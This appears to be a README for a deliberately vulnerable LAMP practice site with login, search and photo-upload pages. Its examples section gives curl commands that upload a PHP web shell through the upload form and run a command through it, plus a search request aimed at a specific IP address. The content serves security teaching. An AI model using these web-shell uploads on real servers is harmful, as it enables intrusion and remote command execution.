# Web Server

### LAMP

- Linux
- Apache Web Server
- MySQL Database Server
- PHP: backend programming language

### Database

#### Table&Column

- user
- user_group
- target_order

### Web Pages

- [login/register](https://www.tutorialspoint.com/php/php_mysql_login.htm)
- welcome
- search
- user profile(for photo uploading)



## SQL injections example

#### 1. Shell Injection

```shell
$ curl -F "image=@path/shell.php" http://IP_address/upload.php
$ curl -X GET  http://IP_address/images/shell.php\?cmd\=uname
```

#### 2. SQL Injection 

```shell
$ curl -X GET  http://52.37.128.197/search.php\?query\=a 
```



## Extensibility

1. Create your own database using your sql file
2. Modify the PHP source files, including functions and the level of security 



## References

[SQL injection](http://php.net/manual/en/security.database.sql-injection.php)